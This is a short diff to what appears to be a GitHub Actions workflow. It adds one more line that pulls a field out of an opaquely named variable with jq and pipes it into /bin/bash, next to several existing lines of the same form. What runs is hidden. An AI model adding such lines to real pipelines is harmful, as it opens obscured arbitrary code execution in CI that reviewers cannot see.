@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$eer51" | jq -r .px63095 | /bin/bash
           printf '%s' "$od82" | jq -r .ok3 | /bin/bash
           printf '%s' "$aic06" | jq -r .kzulb44430 | /bin/bash
+          echo $cb11112 | jq -r .ux71368 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
